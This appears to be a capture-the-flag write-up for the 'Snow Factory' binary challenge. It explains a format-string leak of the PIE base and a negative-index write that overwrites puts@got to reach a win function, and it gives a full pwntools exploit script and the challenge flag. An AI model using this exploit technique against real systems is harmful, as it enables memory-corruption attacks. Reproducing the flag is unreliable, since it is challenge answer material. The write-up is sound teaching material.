# Snow Factory

**Author**: r3dsh3rl0ck

**Description**: With Christmas on the horizon, can you lend a hand at the snow factory as they get ready to pack presents they GOT for Santa?

**Handout**: `snow-factory`

## Overview

We are given a 64-bit ELF binary `snow_factory` which is dynamically linked and not stripped. The goal is to exploit it to retrieve the flag. The description emphasizes "GOT", hinting at a Global Offset Table overwrite.

## Analysis

### Checksec

First, we check the binary's security properties using the `checksec` command (part of the **pwntools** suite):

```bash
checksec --file=snow-factory/snow_factory
```

The output is as follows:

```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

Key takeaways:

- **Partial RELRO**: The Global Offset Table (GOT) is writable [[1]](#ref1). This allows us to overwrite function pointers resolved at runtime.
- **PIE Enabled**: The executable's code segment is loaded at a randomized address [[2]](#ref2). We need a memory leak to calculate the base address before we can jump to any internal functions.

### Reverse Engineering

Decompiling the `main` function reveals the logic:

1. **Format String Vulnerability**: The program asks for a name and prints it using `printf(name)` without a format specifier. This allows an attacker to leak values from the stack [[3]](#ref3).
2. **Input Handling**: It asks for a "box" index and a "present" number.
3. **Arbitrary Write (CWE-129)**: The program assigns the present to the box array: `boxes[index] = present`. There is no bounds check on the `index`. Using a negative index with an array allows writing to memory locations preceding the array [[4]](#ref4).

There is also a `win` function at offset `0x1229` (verified via disassembly) that executes `system("/bin/cat flag.txt")`.

## The Exploit Strategy

### 1. Leak PIE Base

Since PIE is enabled, we don't know the address of `win` or `boxes`. We can use the format string vulnerability to leak an address from the stack.
By fuzzing the format string (sending `%p`, `%2$p`, etc.), we found that the **25th** argument on the stack matches an address in the `main` function (specifically `base + 0x1243`).

- Leaks `main` address -> calculate `base_addr`.
- Calculate `win_addr = base_addr + 0x1229`.

### 2. Overwrite GOT

We want to redirect execution to `win`. Since the binary is **Partial RELRO**, the GOT is writable. We can overwrite the `puts` entry in the GOT so that when `puts` is called, our code runs instead.

- `boxes` array is at offset `0x4080`.
- `puts@got` is at offset `0x4008`.
- **Target Index Calculation**: The distance between the array start and the target address, divided by the element size (8 bytes for 64-bit integers):
  - `(0x4008 - 0x4080) / 8 = -15`

So, setting `boxes[-15]` to `win_addr` will overwrite `puts@got`.

## Solution Script

Here is the full exploit script using `pwntools`:

```python
from pwn import *

# Context
context.update(arch='amd64', os='linux')
exe = './snow-factory/snow_factory'
elf = ELF(exe, checksec=False)

# Offsets derived from binary analysis
OFFSET_MAIN = 0x1243       # Offset of the address leaked by %25$p
OFFSET_WIN = 0x1229        # Offset of the win function
OFFSET_PUTS_GOT = 0x4008   # Offset of puts in GOT
OFFSET_BOXES = 0x4080      # Offset of the boxes array

def exploit():
    try:
        # Connect to remote target with SSL
        p = remote('snow-factory.julec.tf', 1337, ssl=True)
        
        # --- Stage 1: Leak PIE Base ---
        # "What's your name: " -> Send format string
        # %25$p leaks a pointer to main+offset
        p.sendlineafter(b"What's your name: ", b'%25$p')
        p.recvuntil(b"Hello ")
        leak_str = p.recvline().decode().strip()
        leak_addr = int(leak_str, 16)
        
        # Calculate base address and win function address
        base_addr = leak_addr - OFFSET_MAIN
        win_addr = base_addr + OFFSET_WIN
        
        log.info(f"Leak: {hex(leak_addr)}")
        log.info(f"Base: {hex(base_addr)}")
        log.info(f"Win:  {hex(win_addr)}")
        
        # --- Stage 2: GOT Overwrite ---
        # "Which box do you want..." -> Send negative index
        # We want to write to puts@got relative to boxes[]
        target_addr = base_addr + OFFSET_PUTS_GOT
        start_addr = base_addr + OFFSET_BOXES
        index = (target_addr - start_addr) // 8  # Should be -15
        
        log.info(f"Target index: {index}")
        
        p.sendlineafter(b"Which box do you want to put your present in:", str(index).encode())
        
        # "What present number..." -> Send the address of win
        p.sendlineafter(b"What present number do you want to put in:", str(win_addr).encode())
        
        # --- Stage 3: Trigger ---
        # The program calls puts() at the end, which now points to win()
        p.interactive()
        
    except Exception as e:
        log.error(f"Exploit failed: {e}")

if __name__ == "__main__":
    exploit()
```

## Flag

`JUL{3xpl01t1ng_th3_sn0w_f4ct0ry_f0r_fun_4nd_fun}`

## References

<a name="ref1">[1]</a> **RELRO (Relocation Read-Only)**: A security measure that makes the Global Offset Table (GOT) read-only. Partial RELRO allows the GOT to be written to, enabling GOT overwrite attacks. [CTF 101: RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/)

<a name="ref2">[2]</a> **PIE (Position Independent Executable)**: A security feature that loads the program at a random memory address each time it is executed. [Ir0nstone's Notes: PIE](https://ir0nstone.gitbook.io/notes/types/stack/pie)

<a name="ref3">[3]</a> **Format String Vulnerability**: A vulnerability where user input is passed as the format string to `printf`, allowing stack reads and arbitrary writes. [OWASP: Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)

<a name="ref4">[4]</a> **CWE-129: Improper Validation of Array Index**: Using an array index without validating it allows accessing memory outside the array bounds. [CWE-129](https://cwe.mitre.org/data/definitions/129.html)
